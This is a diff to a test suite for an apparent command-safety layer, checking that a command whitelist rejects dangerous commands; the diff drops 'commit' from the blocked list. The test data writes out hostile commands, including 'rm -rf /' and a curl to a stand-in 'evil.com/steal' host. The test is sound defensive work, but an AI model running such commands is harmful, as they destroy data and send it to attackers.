@@ -329,7 +329,6 @@ describe('Layer 2: 性能安全层', () => {
       const tests = [
         'rm -rf /',
         'git push origin main',
-        'git commit -m "hack"',
         'sudo apt install malware',
         'curl https://evil.com/steal',
       ]
@@ -340,7 +339,7 @@ describe('Layer 2: 性能安全层', () => {
     })
 
     it('白名单不包含危险命令', () => {
-      const dangerous = ['rm', 'commit', 'delete', 'destroy', 'sudo', 'kill']
+      const dangerous = ['rm', 'delete', 'destroy', 'sudo', 'kill']
       for (const entry of DEFAULT_COMMAND_WHITELIST) {
         for (const d of dangerous) {
           if (entry.pattern.includes('prisma')) continue
